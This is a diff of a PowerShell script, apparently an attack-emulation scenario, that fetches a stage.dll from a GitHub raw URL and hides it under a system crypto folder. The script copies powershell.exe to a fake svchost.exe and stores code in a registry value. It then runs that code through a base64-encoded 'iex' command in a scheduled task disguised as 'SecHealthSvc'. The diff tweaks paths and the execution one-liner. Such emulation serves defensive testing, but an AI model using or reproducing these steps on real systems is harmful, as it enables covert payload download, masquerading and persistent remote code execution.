@@ -1,13 +1,13 @@
 param()
 
 # Configuration
-$githubBase = "https://raw.githubusercontent.com/Justanother-engineer/scenario1/main"
+$githubBase = "https://raw.githubusercontent.com/Justanother-engineer/scenario1/main/scenario-01-rmm/github"
 $stageUrl = "$githubBase/stage.dll"
 $stagePath = "C:\ProgramData\Microsoft\Crypto\RSA\S-1-5-18\stage.dll"
 $infPath = "C:\ProgramData\config.inf"
 $masqueradeSrc = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
 $masqueradeDst = "C:\ProgramData\Microsoft\Windows\Caches\svchost.exe"
-$regPath = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced"
+$regPath = "HKLM:\SOFTWARE\Microsoft\Network"
 $regName = "App"
 $taskName = "SecHealthSvc"
 
@@ -45,7 +45,7 @@ Set-ItemProperty -Path $regPath -Name $regName -Value $spoofSource -Force
 
 # 5. UAC prompt
 $b64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes(
-    "`$c=(gp '$regPath').$regName; iex `$c"
+    "iex(gp '$regPath').$regName"
 ))
 $taskCmd = "$masqueradeDst -NoP -Enc $b64"
 
